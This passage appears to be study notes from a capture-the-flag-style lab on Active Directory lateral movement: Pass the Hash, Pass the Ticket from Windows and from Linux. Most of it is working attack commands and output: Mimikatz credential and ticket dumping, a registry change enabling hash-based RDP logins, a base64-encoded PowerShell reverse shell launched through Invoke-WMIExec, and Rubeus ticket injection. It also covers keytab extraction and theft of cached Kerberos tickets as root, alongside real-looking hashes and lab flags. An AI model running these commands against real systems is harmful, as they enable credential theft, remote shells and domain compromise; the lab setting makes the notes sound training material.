+G3t_4CCE$$_V1@_PTH
+```
+
+
+
+#### Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+```bash
+xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+DisableRestrictedAdmin
+
+#### Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
+
+```cmd
+mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+```
+
+
+
+#### Using David's hash, perform a Pass the Hash attack to connect to the shared folder DC01\david and read the file david.txt.
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
+
+dir \\DC01\david\
+type \\DC01\david\david.txt
+D3V1d_Fl5g_is_Her3
+```
+
+
+
+#### Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder DC01\julio and read the file julio.txt.
+
+```bash
+64f12cddaa88057e06a81b54e73b949b 
+
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
+
+type \\DC01\julio\julio.txt
+JuL1()_SH@re_fl@g
+```
+
+
+
+#### Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe" exit
+
+# On one terminal
+c:\tools\nc.exe -lvnp 8001
+
+```
+
+```pwsh
+# Go to revshells.com and generate the payload with the IP and port, and pick PowerShell #3 (Base64)
+
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAyADkALgAyADAANAAuADIAMwAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+
+ipconfig
+Ethernet adapter Ethernet1 2:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::e005:2b92:a308:2551%13
+   IPv4 Address. . . . . . . . . . . : 172.16.1.5
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.1.1
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.204.23
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+
+
+cd C:\tools\Invoke-TheHash
+Import-Module .\Invoke-TheHash.psd1
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+# Again on the lvnp 8001
+type C:\julio\flag.txt
+JuL1()_N3w_fl@g
+```
+
+
+
+
+
+```cmd
+mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+
+# John's Hash
+c4b0e1b10c7ce2c4723b4e2407ef81a2
+
+impacket-psexec john@10.129.204.23 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
+(same syntax works with impacket-wmiexec, impacket-atexec, impacket-smbexec)
+
+
+python3 psexec.py john@10.129.204.23 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2 
+
+Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.204.23.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+```
+
+```cmd
+evil-winrm -i 10.129.204.23 -u john -H c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+
+
+
+# Pass the Ticket (PtT) from Windows
+
+Moving laterally with a stolen Kerberos ticket instead of an NTLM hash. Since you just finished the PtH/john exercise, note the shift: PtH abuses NTLM, PtT abuses Kerberos. Different auth mechanism, different artifacts.
+
+Kerberos is a network authentication protocol designed to verify the identity of the user or host.
+
+## Kerberos refresher (the mental model you need)
+
+The whole point of Kerberos is to avoiod handing your password to every service. You authenticate once to the KDC (on the DC) by encrypting a timestamp with your password hash; it hands you a TGT (Ticket Granting Ticket). From then on, you present the TGT to request TGS (service tickets) for specific resources. A TGT lets you request tickets for anything you're authorized for; a TGS is scoped to one service.
+
+## Harvesting tickets (needs local admin for all tickets)
+
+Tickets live in LSASS. Two tools:
+
+- `mimikatz sekurlsa::tickets /export` -> writes `.kirbi` files to disk. Naming: computer-account tickets end in `$`; the `krbtgt` service in a filename means it's a TGT.
+- `Rubeus.exe dump /nowrap` -> prints tickets as base64 instead of files (`/nowrap` for clean copy-paste).
+
+
+
+## Pass the Key / OverPass the Hash
+
+This is the bridge between hashes and tickets: take a user's Kerberos key (rc4/aes128/aes256) and forge a full TGT from it.
+
+- Dump keys: `mimikatz sekurlsa::ekeys`
+- Forge: `mimikatz sekurlsa::pth /user:.. /ntlm:..` or `Rubeus.exe asktgt /user:.. /aes256:.. /nowrap`
+
+Key distinction to write down: Mimikatz needs admin; Rubeus `asktgt` does not. Also, using an rc4 (NTLM) key in a modern AES domain can trip an "encryption downgrade" detection, so prefer aes256 when you have it.
+
+## Actually passing the ticket
+
+Several routes, all landing at "import ticket -> access resource":
+
+- `Rubeus.exe asktgt ... /ptt`: forge and inject in one step
+- `Rubeus.exe ptt /ticket:<file.kirbi>` or `/ticket:<base64>`: inject an existing ticket
+- `mimikatz kerberos::ptt <file.kirbi>`: same via Mimikatz
+- Convert a `.kirbi` to base64 in PowerShell with `[Convert]::ToBase64String([IO.File]::ReadAllBytes("..."))`
+
+Success looks like `Ticket successfully imported!`, after which `dir \\DC01.inlanefreight.htb\c$` works.
+
+## PtT + PowerShell Remoting (this ties directly to your john exercise)
+
+If a user is in Remote Management Users but not admin, exactly john's situation from the last task - you can PtT then `Enter-PSSession - ComputerName DC01`. Two setups shown:
+
+- Mimikatz: `kerberos::ptt` <john.kirbi> -> launch `powershell` -> `Enter-PSSession`
+- Rubeus: `createnetonly /program:cmd.exe /show` (spins up a sacrificial logon session so you don't clobber yoyr current TGTs) -> in that window `asktgt /user:john ... /ptt` -> `Enter-PSSession`
+
+PtT is the Kerberos cousin of PtH. Getting a ticket = harvest an existing one (`sekurlsa::tickets`/`Rubeus dump`) or forge one from a key (OverPass the Hash via `ekeys` -> `asktgt`). Using it = `ptt` in any of the three tools. And the recurring privilege lesson from your john exercise reappears here: Remote Management Users membership -> PowerShell Remoting works without admin, which is exactly what makes the `Enter-PSSession` path viable.
+
+## Commands
+
+
+
+### Harvesting tickets (need local admin for all users' tickets)
+
+
+
+#### Mimikatz - export tickets to `.kirbi` files
+
+```bash
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+exit
+
+dir *.kirbi
+```
+
+
+
+#### Rubeus - dump tickets as base64
+
+```bash
+Rubeus.exe dump /nowrap
+```
+
+
+
+### Pass the Key / OverPass the Hash
+
+
+
+#### Extract Kerberos encryption keys (Mimikatz)
+
+```bash
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+```
+
+
+
+#### Forge TGT from a hash/key - Mimikatz (needs admin)
+
+```bash
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+
+
+#### Forge TGT from a key - Rubeus (no admin needed)
+
+```bash
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256_KEY> /nowrap
+```
+
+
+
+### Pass the Ticket (import + use)
+
+
+
+#### Rubeus - forge and inject in one step
+
+```bash
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HASH> /ptt
+```
+
+
+
+#### Rubeus - inject an existing ticket (file or base64)
+
+```bash
+Rubeus.exe ptt /ticket:<ticket.kirbi>
+Rubeus.exe ptt /ticket:<BASE64_TICKET>
+```
+
+
+
+#### Mimikatz - inject a `.kirbi`
+
+```bash
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\path\to\ticket.kirbi"
+exit
+```
+
+
+
+#### Convert `.kirbi` -> base64 (PowerShell)
+
+```bash
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket.kirbi>"))
+```
+
+
+
+#### Verify the ticket works
+
+```bash
+dir \\DC01.inlanefreight.htb\c$
+```
+
+
+
+### PtT + PowerShell Remoting (Remote Management Users, no admin)
+
+
+
+#### Mimikatz route
+
+```bash
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\path\to\john.kirbi"
+exit
+
+powershell
+Enter-PSSession -ComputerName DC01
+```
+
+
+
+#### Rubeus route (sacrificial logon session)
+
+```bash
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+
+Then in the new `cmd` window
+
+```bash
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES256_KEY> /ptt
+
+powershell
+Enter-PSSession -ComputerName DC01
+```
+
+- `/nowrap` (Rubeus) keeps base64 on one line for clean copy-paste
+- `/ptt` injects directly into your current session vs. `dump`/`export` which just retrieves.
+- `createnetonly` matters when you don't want to overwrite the TGTs already in your logon session - it spins up a throwaway one (LOGON_TYPE 9) instead. And the privilege split worth memorizing: Mimikatz needs admin, Rubeus `asktgt` doesn't.
+
+
+
+## Connect to HTB
+
+
+
+#### Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+
+```bash
+xfreerdp /v:10.129.204.23 /u:Administrator /p:'AnotherC0mpl3xP4$$' /cert:ignore +auto-reconnect /timeout:20000
+```
+
+```cmd
+cd C:\tools
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+exit
+
+dir *.kirbi
+```
+
+3
+
+#### Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder DC01.inlanefreight.htb\john
+
+The Group headings are the key. Mimikatz sorts every account's tickets into groups:
+
+- Group 0 - Ticket Granting Service: These are TGS (service tickets). Everything under here in your paste is `cifs`, `LDAP`, `ldap` - service tickets for reaching specific services on DC01. Not TGTs.
+- Group 2 - Ticket Granting Ticket -> These are the TGTs. That heading is literally telling you.
+
+```cmd
+Authentication Id : 0 ; 306344 (00000000:0004aca8)
+Session           : Service from 0
+User Name         : john
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 7/22/2026 4:39:37 PM
+SID               : S-1-5-21-3325992272-2815718403-617452758-1108
+
+         * Username : john
+         * Domain   : INLANEFREIGHT.HTB
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 7/22/2026 4:39:52 PM ; 7/23/2026 2:39:52 AM ; 7/29/2026 4:39:52 PM
+           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
+           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
+           Client Name  (01) : john ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
+           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             2a1f8e1062930e2f8e6af224d55c0378420c73e4984e13db424242fc70c0022f
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
+```
+
+```cmd
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\tools\[0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+```
+
+```cmd
+dir \\DC01.inlanefreight.htb\john
+type \\DC01.inlanefreight.htb\john\john.txt
+Learn1ng_M0r3_Tr1cks_with_J0hn
+```
+
+
+
+#### Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+
+```cmd
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\tools\[0;4aca8]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+
+powershell
+
+Enter-PSSession -ComputerName DC01
+
+whoami
+type C:\john\john.txt
+P4$$_th3_Tick3T_PSR
+```
+
+
+
+#### Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.
+
+```cmd
+Rubeus.exe dump /nowrap
+
+ UserName                 : john
+  Domain                   : INLANEFREIGHT
+  LogonId                  : 0x4aca8
+  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
+  AuthenticationPackage    : Kerberos
+  LogonType                : Service
+  LogonTime                : 7/22/2026 4:39:37 PM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : INLANEFREIGHT.HTB
+  UserPrincipalName        : john@inlanefreight.htb
+
+
+    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
+    ServiceRealm             :  INLANEFREIGHT.HTB
+    UserName                 :  john
+    UserRealm                :  INLANEFREIGHT.HTB
+    StartTime                :  7/22/2026 4:39:52 PM
+    EndTime                  :  7/23/2026 2:39:52 AM
+    RenewTill                :  7/29/2026 4:39:52 PM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  Kh+OEGKTDi+OavIk1VwDeEIMc+SYThPbQkJC/HDAAi8=
+    Base64EncodedTicket   :
+
+      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6jZ/6a01kF0wAH2mnh3oDBnyLdBTBXyC+CH39adAw+kq2J0lQphI1hus8nx0cCf0kwtEF07OkMduiFJWVfBLhodZmF7ywV5mlP7Eod1deb2VK0ay3ko8YFqpf7HLUIZbg4mZXkIPEUHqQXYd/DTbkkKmgXZZpnRt29w1Kng2bt7AxH0DDBjQm9DSWj49N73MRuk3jU9jPtTV74zG2Gnv0s/8/UuhYzgLGpNkXOFNegR1KWZUTLv4I/TcvGj3OiSg1b6P1BxVwG5OMjFQF9dgKjV5EMuyX6689mmdbfr84d8URcSa71yiRs2OZbHOEHyzPk6cKcjCk+qsrfWB1ARtKUbxS5MfgLAoUpiPzBH5QjfVTTpsdPWq1nx7m3WXFKpdZKfL3F09l+LSXAwq/pidIH+m2np+iulpjsCMQ8fdiMUTf/DFxjt5F/P849OUMs2F8JLEP/7jbE0zzGCa42BCRt3pBFtasw60r/n7YNJg6DmDsR7xCh2ggKm9HMmAHAuRNx9As9oDVKZ4/lQo3c4fkdDbo8hAnwRd+YYS6W6gV02j6XqhchtzPEmgz55pLhnXD4LiuKF8RR9y4OYGq0rt2rChkgw6I7SDnIP/Yge/aCUNoNw5niX/3iQBxFzoJlCB0VtxwmY13tcEQQIrpNyVDwJs3bL9RC/hFjnuO+7YPqW/refL1A+ozdQAEwycwUGEp8YE1W3YBatjp24jrU4grAH5+TgzKFMsE1DYQRI5aOYBOnfcWr8dewGEBzVDZdJAKeLOIwkm+1hDcN4ysl/uGi7j/SBf6HhLjydaAMwCoAsdhF/N4oOFIge8XxTQItWJIT1zfvndJzALKIhohzWWRD5GVj++8x22Vm5yt687EDAsQ+w2V+FbjLMxATco8jvRDXvDTBEsrG1zKXDF/yequ3jZbM4T4UdLGCkT9KFuVLqq2GD96F38Ruu0V+2SqzGChTDkAt6W73fnT/ssFlxZSWUCkeU79rUhlH8MWi9z5dSiZ0PC1eIB86TnpbrvJR2XdwLehPjqnU4lAucSBreIszs12xYODj/hoC0zvRh37Q+3AssRJpP3mdvavlW7ZrjgJiG7nJFJ9t09fznYLVk/+PmiJJPgp+c4Qcm9QAI6aKICdXNQjA7jNDa1QBmZ1iecCiZTmrKf5MWw2PrTeT4so07LuqXQsQ7VdtrKRAzVDDtotgKn1sheNeyEjA3o0Q2tMWuE/pTlfYsXex5IQp2vmG1dAGjNkM662rp1z6A8puZ2XE0npik2884dXqfLM6eVegfZvLvJkX1cG8uyns2hCHOgBGVz29DlYP0s4VgMDH413BDoN2QFFGv/Qc5GChQ35sXikYG/GCay2rbgjcZiOIc4E6jTAErXEmsK+qCbYdm9XkduOr3Y9duGl5oP0LJbQHJdabJEBFwy2CKjq9ayiqq7u23v3bgmhSqSjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAqH44QYpMOL45q8iTVXAN4Qgxz5JhOE9tCQkL8cMACL6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA3MjIyMTM5NTJaphEYDzIwMjYwNzIzMDczOTUyWqcRGA8yMDI2MDcyOTIxMzk1MlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
+
+Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6jZ/6a01kF0wAH2mnh3oDBnyLdBTBXyC+CH39adAw+kq2J0lQphI1hus8nx0cCf0kwtEF07OkMduiFJWVfBLhodZmF7ywV5mlP7Eod1deb2VK0ay3ko8YFqpf7HLUIZbg4mZXkIPEUHqQXYd/DTbkkKmgXZZpnRt29w1Kng2bt7AxH0DDBjQm9DSWj49N73MRuk3jU9jPtTV74zG2Gnv0s/8/UuhYzgLGpNkXOFNegR1KWZUTLv4I/TcvGj3OiSg1b6P1BxVwG5OMjFQF9dgKjV5EMuyX6689mmdbfr84d8URcSa71yiRs2OZbHOEHyzPk6cKcjCk+qsrfWB1ARtKUbxS5MfgLAoUpiPzBH5QjfVTTpsdPWq1nx7m3WXFKpdZKfL3F09l+LSXAwq/pidIH+m2np+iulpjsCMQ8fdiMUTf/DFxjt5F/P849OUMs2F8JLEP/7jbE0zzGCa42BCRt3pBFtasw60r/n7YNJg6DmDsR7xCh2ggKm9HMmAHAuRNx9As9oDVKZ4/lQo3c4fkdDbo8hAnwRd+YYS6W6gV02j6XqhchtzPEmgz55pLhnXD4LiuKF8RR9y4OYGq0rt2rChkgw6I7SDnIP/Yge/aCUNoNw5niX/3iQBxFzoJlCB0VtxwmY13tcEQQIrpNyVDwJs3bL9RC/hFjnuO+7YPqW/refL1A+ozdQAEwycwUGEp8YE1W3YBatjp24jrU4grAH5+TgzKFMsE1DYQRI5aOYBOnfcWr8dewGEBzVDZdJAKeLOIwkm+1hDcN4ysl/uGi7j/SBf6HhLjydaAMwCoAsdhF/N4oOFIge8XxTQItWJIT1zfvndJzALKIhohzWWRD5GVj++8x22Vm5yt687EDAsQ+w2V+FbjLMxATco8jvRDXvDTBEsrG1zKXDF/yequ3jZbM4T4UdLGCkT9KFuVLqq2GD96F38Ruu0V+2SqzGChTDkAt6W73fnT/ssFlxZSWUCkeU79rUhlH8MWi9z5dSiZ0PC1eIB86TnpbrvJR2XdwLehPjqnU4lAucSBreIszs12xYODj/hoC0zvRh37Q+3AssRJpP3mdvavlW7ZrjgJiG7nJFJ9t09fznYLVk/+PmiJJPgp+c4Qcm9QAI6aKICdXNQjA7jNDa1QBmZ1iecCiZTmrKf5MWw2PrTeT4so07LuqXQsQ7VdtrKRAzVDDtotgKn1sheNeyEjA3o0Q2tMWuE/pTlfYsXex5IQp2vmG1dAGjNkM662rp1z6A8puZ2XE0npik2884dXqfLM6eVegfZvLvJkX1cG8uyns2hCHOgBGVz29DlYP0s4VgMDH413BDoN2QFFGv/Qc5GChQ35sXikYG/GCay2rbgjcZiOIc4E6jTAErXEmsK+qCbYdm9XkduOr3Y9duGl5oP0LJbQHJdabJEBFwy2CKjq9ayiqq7u23v3bgmhSqSjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAqH44QYpMOL45q8iTVXAN4Qgxz5JhOE9tCQkL8cMACL6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjA3MjIyMTM5NTJaphEYDzIwMjYwNzIzMDczOTUyWqcRGA8yMDI2MDcyOTIxMzk1MlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
+
+powershell
+Enter-PSSession -ComputerName DC01
+whoami
+type C:\john\john.txt
+```
+
+
+
+# Pass the Ticket (PtT) from Linux
+
+
+
+## Overview
+
+Linux machines can join Active Directory for centralized identity management, typically using Kerberos for authentication. If you compromise a domain-joined Linux machine, you can hunt for Kerberos tickets to impersonate other users and expand access. A machine doesn't strictly need to be domain-joined to use Kerberos tickets.
+
+## Kerberos on Linux
+
+Windows and Linux use the same process to request TGTs and TGSs, but storage differs:
+
+- ccache files: Stored in `/tmp` by default. Location set in `KRB5CCNAME` environment variable. Protected by read/write permissions -- root or privileged users can access them. 
+- keytab files: Contain pairs of Kerberos principals and encrypted keys (derived from the password). Allow passwordless authentication, often used in scripts/cronjobs. Must be recreated when the password changes. Portable across machines.
+
+
+
+## Scenario
+
+`LINUX01` is domain-joined and reachable only through `MS01`. Access via RDP->SSH, or port forward (TCP/2222 on MS01 -> TCP/22 on LINUX01). Given credentials: `david@inlanefreight.htb`/`Password2`.
+
+```bash
+ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+```
+
+
+
+### Identifying Linux and Active Directory integration
+
+```bash
+realm list
+```
+
+Confirms Kerberos membership, domain name, and permitted logins/groups. If `realm` is unavailable, check for `sssd`/`winbind` services:
+
+```bash
+ps -ef | grep -i "winbind\|sssd"
+```
+
+
+
+### Finding Kerberos tickets in Linux
+
+
+
+#### Finding KeyTab files:
+
+```bash
+find / -name *keytab* -ls 2>/dev/null
+```
+
+You need read and write privileges to use a keytab. Also check cronjobs for scripts using keytabs:
+
+```bash
+crontab -l
+cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+```
+
+Scripts using `kinit` indicate Kerberos in use (`kinit` requests the TGT and stores it in cache). The default machine keytab is `/etc/krb5.keytab` (root-only) - access it to impersonate `LINUX01$`.
+
+#### Finding ccache files:
+
+```bash
+env | grep -i krb5
+ls -la /tmp
+```
+
+
+
+### Abusing KeyTab files
+
+List keytab contents to find the principal:
+
+```bash
+klist -k -t /opt/specialfiles/carlos.keytab
+```
+
+Impersonate the user (`kinit` is case-sensitive -- match the principal exactly):
+
+```bash
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist
+```
+
+Verify access:
+
+```bash
+smbclient //dc01/carlos -k -c ls
+```
+
+
+
+### KeyTab Extract
+
+Extract hashes (realm, SPN, encryption type, hashes) from a keytab with KeyTabExtract:
+
+```bash
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+```
+
+This yields NTLM (for Pass the Hash), AES-256, and AES-128 hashes. NTLM is easiest to crack -- use Hashcat, John, or CrackStation. Then log in:
+
+```bash
+su - carlos@inlanefreight.htb
+```
+
+
+
+### Obtaining more hashes
+
+Repeat the process on other keytabs found in cronjobs (e.g., `svc_workstations.kt`) to crack passwords and pivot to more accounts.
+
+## Abusing KeyTab ccache
+
+ccache files need only read privileges but are readable only by their owner -- unless you're root. After gaining `svc_workstations`, check privileges and escalate:
+
+```bash
+sudo -l
+sudo su
+```
+
+As root, enumerate tickets:
+
+```bash
+ls -la /tmp
+```
+
+Check group membership of unaccessed users:
+
+```bash
+id julio@inlanefreight.htb
+```
+
+If a user is in Domain Admins, import their ccache file:
+
+```bash
+klist
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+smbclient //dc01/C$ -k -c ls -no-pass
+```
+
+Watch the valid starting / expires values -- expired tickets won't work.
+
+## Using Linux attack tools with Kerberos
+
+Ensure `KRB5CCNAME` points to the desired ccache. From a non-domain attack host, you must reach the KDC/DC and have working name resolution. Here, proxy traffic through MS01 with Chisel + Proxychains, and hardcode `/etc/hosts`.
+
+```bash
+cat /etc/hosts
+
+cat /etc/proxychains.conf	# socks5 127.0.0.1 1080
